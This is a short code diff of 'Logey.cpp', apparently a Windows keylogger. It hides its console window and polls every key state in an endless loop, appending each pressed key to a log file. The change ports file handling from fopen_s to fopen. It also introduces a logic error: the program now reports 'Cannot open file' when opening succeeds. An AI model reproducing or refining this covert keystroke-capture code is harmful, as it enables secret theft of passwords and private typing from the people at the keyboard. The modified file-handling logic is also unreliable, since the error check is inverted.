@@ -1,18 +1,18 @@
 // Logey.cpp : Defines the entry point for the console application.
 //
 
-#include "stdafx.h"
 #include "logey.h"
 
 int main() {
 
 	if (!debug) hideConsole();
 
+	string logFile = "logey.log";
 	while (true) // infinite loop
 	{
 		for (int i = 8; i <= 255; i++) {
 			if (GetAsyncKeyState(i) == -32767) {
-				keys(i, "logey.log");
+				keys(i, logFile.c_str());
 			}
 		}
 		Sleep(100);
@@ -21,11 +21,10 @@ int main() {
 	return 0;
 }
 
-void keys(int key, char *filename) {
+void keys(int key, const char *filename) {
 
 	FILE *OUTPUT_FILE;
-	errno_t err;
-	if (err = fopen_s(&OUTPUT_FILE, filename, "a+")) {
+	if (OUTPUT_FILE = fopen(filename, "a+")) {
 		cout << "Cannot open file." << endl;
 	}
 
